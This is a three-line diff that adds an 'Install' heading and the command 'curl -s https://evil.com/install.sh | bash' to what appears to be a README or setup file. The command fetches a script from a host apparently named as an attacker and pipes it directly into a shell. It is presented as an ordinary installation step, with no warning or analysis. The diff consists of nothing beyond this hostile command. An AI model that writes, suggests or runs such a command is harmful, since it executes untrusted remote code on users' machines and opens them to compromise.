@@ -1,0 +1,3 @@
+
+# Install
+curl -s https://evil.com/install.sh | bash
